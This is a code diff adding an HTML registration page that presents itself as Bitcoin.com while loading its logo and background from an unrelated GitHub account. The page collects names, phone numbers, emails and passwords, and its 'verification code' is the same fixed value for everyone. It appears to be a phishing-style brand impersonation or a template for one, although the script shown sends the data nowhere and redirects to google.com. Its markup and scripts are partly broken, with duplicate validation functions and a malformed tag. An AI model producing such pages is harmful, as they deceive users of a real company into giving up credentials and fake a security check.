@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bitcoin.com Registration</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: url('https://raw.githubusercontent.com/babayaga56/cooker/4353ea9a0b8db94a963be7a2ead2dc7f17b9840b/cooker.jpg') center/cover fixed no-repeat; /* Set your image URL */
+        }
+
+        #header, #container, #footer {
+            padding: 10px;
+            text-align: center;
+        }
+
+        #logo {
+            max-width: 100px;
+            max-height: 100px;
+        }
+        #editableText {
+            font-weight: bold;
+            margin-top: 20px; /* Editable margin top */
+            margin-bottom: 10px; /* Editable margin bottom */
+            font-size: 30px; /* Editable font size */
+            color: rgb(17, 16, 16); /* Editable text color */
+        }
+
+        #container {
+            width: 90%;
+            height: 600%;
+            margin: 20px auto;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            position: relative; /* Add this line */
+        }
+
+        input, select {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            display: inline-block;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+            border-radius: 20px;
+        }
+
+        #registerBtn {
+            background-color: #15ba3e;
+            color: #fff;
+            padding: 15px;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            width: 80%; /* You can adjust the width as needed */
+            display: block;
+            margin: 0 auto; /* Center the button horizontally */
+        }
+
+        #footer {
+            color: rgb(18, 18, 18);
+            padding: 10px;
+            text-align: center;
+            width: 100%; /* Adjusted width */
+        }
+        #verificationCodeContainer {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        #verificationCode {
+            flex-grow: 1;
+        }
+
+        #sendVerificationBtn {
+            align-items: left;
+            background-color: #15ba3e;
+            color: #fff;
+            padding: 10px;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            margin-left: 10px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="header">
+        <img id="logo" src="https://raw.githubusercontent.com/babayaga56/logo/32b4389c734311c2cf1bf0ee603e7c5d54c0877b/favicon-32x32.png" alt="">
+        <h2>Bitcoin.com</h2>
+        <div id="editableText" contenteditable="true">Register with Bitcoin.com and start Investing</div>
+    </div>
+
+    <div id="container">
+        <form id="registrationForm" onsubmit="return validateForm()">
+            <label for="firstName"></label>
+            <input type="text" id="firstName" name="firstName" required placeholder="First Name">
+
+            <label for="middleName"></label>
+            <input type="text" id="middleName" name="middleName" placeholder="Middle Name">
+
+            <label for="lastName"></label>
+            <input type="text" id="lastName" name="lastName" required placeholder="Last Name">
+
+            <label for="country"></label>
+            <select id="country" name="country" required>
+                <!-- Add your country options here -->
+                <option value="country1">United States of America</option>
+                <option value="country2">United Kingdom</option>
+                <option value="country2">Spain</option>
+                <option value="country2">Canada</option>
+                <option value="country2">Mexico</option>
+                <option value="country2">France</option>
+                <option value="country2">Germany</option>
+                <option value="country2">Italy</option>
+                <option value="country2">Belgium</option>
+                <option value="country2">Portugal</option>
+                <option value="country2">India</option>
+                <option value="country2">Brazil</option>
+                <option value="country2">Argentina</option>
+                <option value="country2">Russia</option>
+                <option value="country2">South Africa</option>
+                <option value="country2">Switzerland</option>
+                <option value="country2">Romania</option>
+                <option value="country2">Austria</option>
+                <option value="country2">Denmark</option>
+                <option value="country2">Latvia</option>
+                <option value="country2">Estonia</option>
+                <option value="country2">Hungary</option>
+                <option value="country2">Bulgaria</option>
+                <option value="country2">malta</option>
+                <option value="country2">Netherlands</option>
+                <option value="country2">Poland</option>
+                <option value="country2">Sweden</option>
+                <option value="country2">Turkey</option>
+                <option value="country2">Slovenia</option>
+                <option value="country2">Slovakia</option>
+                <option value="country2">United Arab Emirates</option>
+                <option value="country2">Taiwan</option>
+                <option value="country2">Vietnam</option>
+                <option value="country2">Thailand</option>
+                <option value="country2">Korea</option>
+                <option value="country2">Japan</option>
+                <!-- Add more options as needed -->
+            </select>
+
+            <label for="phoneNumber"></label>
+            <input type="tel" id="phoneNumber" name="phoneNumber" required placeholder="Enter phone number with country code">
+
+            <label for="email"></label>
+            <input type="email" id="email" name="email" required placeholder="Email Address">
+
+            <label for="password"></label>
+            <input type="password" id="password" name="password" required placeholder="Password">
+
+            <label for="repeatPassword"></label>
+            <input type="password" id="repeatPassword" name="repeatPassword" required placeholder="Repeat Password">
+           
+            <id="registrationForm" onsubmit="return validateForm(event)">
+            <label for="verificationCode"></label>
+                <input type="text" id="verificationCode" name="verificationCode" required placeholder="Verification Code">
+                <button type="button" id="sendVerificationBtn" onclick="sendVerificationCode()">Get Verification Code</button>
+
+            <button type="submit" id="registerBtn">Register</button>
+        </form>
+    </div>
+
+    <div id="footer">
+        <p>© 2024 Saint Bitts LLC<br>
+        Bitcoin.com<br>
+        All rights reserved.<br>
+        support@bitcoin.com</p>
+    </div>
+
+    <script>
+        function sendVerificationCode() {
+        // Display a popup with the fixed verification code
+        alert("Your verification code is: 763456");
+    }
+
+    function validateForm(event) {
+        // You can add additional form validation logic here if needed
+        // For example, check if the verification code input is filled
+        var verificationCode = document.getElementById('verificationCode').value;
+        if (!verificationCode) {
+            alert("Please enter the verification code.");
+            event.preventDefault(); // Prevent form submission if verification code is not entered
+        }
+    }
+
+function validateForm() {
+            // Your password validation logic here
+            var password = document.getElementById('password').value;
+            var repeatPassword = document.getElementById('repeatPassword').value;
+            var verificationCode = document.getElementById('verificationCode').value;
+
+            // Check if passwords match
+            if (verificationCode !== '763456') {
+                alert("Incorrect verification code. Please check your email for the correct code.");
+                return false;
+            }
+
+            if (password !== repeatPassword) {
+                alert("Passwords do not match!");
+                return false;
+            }
+
+            // Check if password is at least 8 characters
+            if (password.length < 8) {
+                alert("Password must be at least 8 characters!");
+                return false;
+            }
+
+            // Additional validation logic can be added here
+            
+            // Redirect to the provided link
+            window.location.href = 'https://www.google.com';
+
+            // Prevent the default form submission behavior
+            return false;
+        }
+</script>
+
+
+</body>
+</html>
